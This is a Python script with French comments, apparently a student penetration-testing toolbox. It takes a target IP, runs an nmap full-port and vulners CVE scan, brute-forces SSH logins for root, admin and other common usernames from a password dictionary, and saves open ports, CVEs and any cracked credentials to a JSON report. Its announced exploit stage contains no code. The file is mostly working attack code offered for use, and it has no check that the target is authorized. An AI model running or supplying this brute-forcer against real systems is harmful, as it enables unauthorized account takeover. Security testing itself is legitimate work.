
#Ce script permet de faire un test d'intrusion sur une machine distante, il prend comme argument l'adresse IP de la machine distante, et appele les scripts bruteforcesshmdp.py, nmap.py et les exploit compatible afin de rédiger un rapport de test d'intrusion dans un fichier json.
import subprocess
import sys
import json
import datetime

# Lance le script qui installera les dépendances
subprocess.call(["python3", "dependencies.py"])
import paramiko
import re

# Affiche un banner au démmarage du script

print("*******************************************************************************************************************************")
print("  888888                   888                   88888888888 8888888 88888888888                888 888                        ")
print("     88b                   888                       888       888       888                    888 888                        ")
print("     888                   888                       888       888       888                    888 888                        ")
print("     888  .d88b.   .d8888b 888  888  .d88b.  888d888 888       888       888   .d88b.   .d88b.  888 88888b.   .d88b.  888  888 ")
print("     888 d88""88b d88P"    888 .88P d8P  Y8b 888P"   888       888       888  d88""88b d88""88b 888 888 "88b d88""88b `Y8bd8P' ")
print("     888 888  888 888      888888K  88888888 888     888       888       888  888  888 888  888 888 888  888 888  888   X88K   ")
print("     88P Y88..88P Y88b.    888 "88b Y8b.     888     888       888       888  Y88..88P Y88..88P 888 888 d88P Y88..88P .d8""8b. ")
print("     888  "Y88P"   "Y8888P 888  888  "Y8888  888     888     8888888     888   "Y88P"   "Y88P"  888 88888P"   "Y88P"  888  888 ")
print("   .d88P                                                                                                                       ")
print(" .d88P                                                                                                                         ")
print("888P                                                                                                                           ")
print("*******************************************************************************************************************************")

# Ici, il y a toutes les fonctions qui seront appelées lors de l'execution du script

# Fonction qui lance un scan Nmap sur la machine distante
def run_nmap_scan(ip_address):
    # Lance un scan Nmap sur la machine distante
    output = subprocess.check_output(["nmap", "-p-", "-sV", "--script", "vulners", ip_address])
    
    # Sort les ports ouverts, les services et les CVEs
    open_tcp_ports = []
    open_udp_ports = []
    services = {}
    cves = []
    
    lines = output.decode().splitlines()
    for line in lines:
        if "open" in line and "tcp" in line:
            port = line.split("/")[0]
            open_tcp_ports.append(port)
        elif "open" in line and "udp" in line:
            port = line.split("/")[0]
            open_udp_ports.append(port)
        elif "Service Info" in line:
            service = line.split(":")[1].strip()
            services[port] = service
        elif "CVE" in line:
            cve = line.split(":")[1].strip()
            cves.append(cve)
    
    return open_tcp_ports, open_udp_ports, services, cves

# Fonction qui exécute un bruteforce sur le service SSH
def brute_force_ssh(ip):
    usernames = ["debian", "root", "user", "admin"]
    
    with open("dictionary.txt", "r") as f:
        passwords = f.read().splitlines()
    
    for username in usernames:
        for password in passwords:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            try:
                client.connect(ip, username=username, password=password)
                print(f"Successful login: {username}:{password}")
                return f"{username}:{password}"
            except paramiko.AuthenticationException:
                continue
            except Exception as e:
                print(f"Impossible de se connecter en SSH à la machine {ip}: {e}")
                return

# Début du script
# Fonction pour vérifier si une chaîne est une adresse IP valide
def is_valid_ip(ip):
    pattern = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
    return re.match(pattern, ip) is not None

# Demande a l'utilisateur d'entrer l'adresse IP de la machine distante
ip_address = input("Enter the IP address to scan: ")

# Vérifie si l'adresse IP est valide
while not is_valid_ip(ip_address):
    print("Invalid IP address. Please try again.")
    ip_address = input("Enter the IP address to scan: ")

# Execute la fonction run_nmap_scan avec l'adresse IP fournie
print("Lancement du scan Nmap...")
open_tcp_ports, open_udp_ports, services, cves = run_nmap_scan(ip_address)

# Affiche les résultats du scan a l'écran
print("Ports TCP ouvert:", open_tcp_ports)
print("Ports UDP ouvert:", open_udp_ports)
print("Services:", services)
print("CVEs:", cves)

# Appelle la fonction brute_force_ssh avec l'adresse IP fournie
print("Lancement du brute force SSH...")

resultbruteforcessh = brute_force_ssh(ip_address)

# Appel des exploits compatibles
print("Lancement des exploits...")

# Rédaction du rapport de test d'intrusion dans un fichier json
print("Rédaction du rapport de test d'intrusion...")
current_datetime = datetime.datetime.now()
formatted_datetime = current_datetime.strftime("%Y-%m-%d_%H-%M-%S")
json_filename = f"report_{ip_address}_{formatted_datetime}.json"

report = {
    "ip_address": ip_address,
    "open_tcp_ports": open_tcp_ports,
    "open_udp_ports": open_udp_ports,
    "services": services,
    "cves": cves,
    "identifiants SSH": resultbruteforcessh
}

with open(json_filename, "w") as f:
    json.dump(report, f)

print("Rapport de test d'intrusion terminé ! Les résultats sont dans le fichier", json_filename)